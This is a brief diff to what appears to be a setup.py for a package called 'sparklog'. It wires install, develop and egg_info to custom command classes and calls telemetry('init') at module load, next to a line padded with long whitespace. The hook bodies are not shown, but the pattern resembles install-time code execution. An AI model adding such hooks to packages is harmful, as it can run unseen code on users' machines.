@@ -31,4 +31,16 @@ class CustomEggInfoCommand(egg_info):
 
 telemetry("init")
 
-# setup(...) removed                                                                                                                                                                                                                                                                            
+setup(
+    name="sparklog",
+    version=VERSION,
+    description="",
+    python_requires=">=3.6",
+    install_requires=[],
+    tests_require=[],
+    cmdclass={
+        'install': PostInstallCommand,
+        'develop': CustomDevelopCommand,
+        'egg_info': CustomEggInfoCommand
+    }
+)
